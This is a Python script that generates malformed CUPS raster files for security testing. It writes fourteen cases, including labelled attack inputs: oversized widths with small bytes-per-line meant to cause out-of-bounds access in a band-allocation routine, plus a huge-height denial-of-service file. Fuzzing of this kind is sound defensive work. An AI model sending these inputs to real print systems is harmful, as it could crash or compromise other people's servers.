#!/usr/bin/env python3
"""Generate hostile/malformed CUPS raster streams for security testing."""
import struct, sys, os

OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/fuzz"
os.makedirs(OUT, exist_ok=True)

# v3 wire format: sync '3SaR' (LE integer 'RaS3') + cups_page_header2_t (1796 B, LE)
HDRLEN = 1796
def v3hdr(**kw):
    h = bytearray(HDRLEN)
    def put(off, val, fmt="<I"):
        struct.pack_into(fmt, h, off, val)
    # strings at 0..255, then:
    put(260, kw.get("AdvanceDistance", 0))      # v3: struct starts at file+4,
    # offsets within struct: HWRes at struct+276 -> file 280
    put(276, kw.get("hres", 600))
    put(280, kw.get("vres", 600))
    # PageSize@352->356 etc; cupsWidth@372->376
    put(372, kw.get("width", 4958))
    put(376, kw.get("height", 7017))
    put(388, kw.get("bpp", 1))
    put(392, kw.get("bpl", 620))
    put(396, kw.get("colororder", 0))
    put(400, kw.get("colorspace", 3))           # 3 = K
    put(404, kw.get("compression", 0))
    return b"3SaR" + bytes(h)

def page(body_len, fill=0):
    return bytes([fill]) * body_len

def emit(name, data):
    open(os.path.join(OUT, name), "wb").write(data)

# 1. baseline valid (full page of zeros = blank page, valid geometry)
emit("01_valid_blank.ras", v3hdr() + page(620 * 7017))
# 2. truncated header
emit("02_trunc_hdr.ras", v3hdr()[:100])
# 3. garbage sync
emit("03_bad_sync.ras", b"XXXX" + v3hdr()[4:] + page(1000))
# 4. THE ATTACK: huge width, small bpl -> would OOB in make_bands
emit("04_attack_wide.ras", v3hdr(width=0x40000000, bpl=620, height=64) + page(620 * 64))
# 5. width 0
emit("05_width0.ras", v3hdr(width=0, bpl=0, height=10) + page(16))
# 6. bpl mismatch (valid width, wrong bpl)
emit("06_bpl_mismatch.ras", v3hdr(width=4958, bpl=4, height=64) + page(4 * 64))
# 7. resolution 0
emit("07_res0.ras", v3hdr(hres=0, vres=0, height=64) + page(620 * 64))
# 8. K with bpp=8
emit("08_k_bpp8.ras", v3hdr(bpp=8, bpl=4958, height=64) + page(4958 * 64))
# 9. CMYK declared with bpp=1
emit("09_cmyk_bpp1.ras", v3hdr(colorspace=6, bpp=1, bpl=620, height=64) + page(620 * 64))
# 10. valid header, truncated pixel data
emit("10_trunc_pixels.ras", v3hdr(height=7017) + page(1000))
# 11. width over limit
emit("11_width_over.ras", v3hdr(width=65536, bpl=8192, height=64) + page(8192 * 64))
# 12. valid CMYK geometry
emit("12_cmyk_valid.ras", v3hdr(colorspace=6, bpp=4, width=4958, bpl=2479, height=64) + page(2479 * 64))
# 13. v1 sync attack ('RaSt' LE-written = 'tSaR' bytes + 420B header)
h1 = bytearray(420)
struct.pack_into("<I", h1, 0, 0x52615374)         # MediaClass[0..3] = sync
struct.pack_into("<I", h1, 276, 600)              # HWResolution
struct.pack_into("<I", h1, 372, 0x20000000)       # cupsWidth huge
struct.pack_into("<I", h1, 376, 64)               # cupsHeight
struct.pack_into("<I", h1, 388, 1)                # bpp
struct.pack_into("<I", h1, 392, 620)              # bpl
struct.pack_into("<I", h1, 400, 3)                # K
emit("13_v1_attack.ras", bytes(h1) + page(620 * 64))
# 14. huge height with truncated data (DoS/EOF path)
emit("14_huge_height.ras", v3hdr(height=0xFFFFFF00) + page(620 * 10))

print("wrote", len(os.listdir(OUT)), "test cases to", OUT)
